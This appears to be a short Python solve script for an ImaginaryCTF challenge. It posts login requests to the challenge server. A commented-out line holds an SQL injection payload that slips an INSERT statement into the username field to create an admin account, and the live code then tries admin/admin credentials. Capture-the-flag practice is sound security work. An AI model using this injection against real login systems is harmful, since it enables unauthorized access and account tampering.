#!/user/bin python3

import requests

if __name__=='__main__':
    # body = {"username": 'admin"; INSERT INTO users (id, username, password) VALUES (1, "admin", "admin");-- ', "password": ''}
    body = 'username={}&password=password'
    res = requests.post("http://blank.chal.imaginaryctf.org/login", params=body)
    print(res.text)
    # body = {"username": 'admin', "password": 'admin'}
    body="username=admin&password=admin"
    res = requests.post("http://blank.chal.imaginaryctf.org/login", params=body)
    print(res.text)
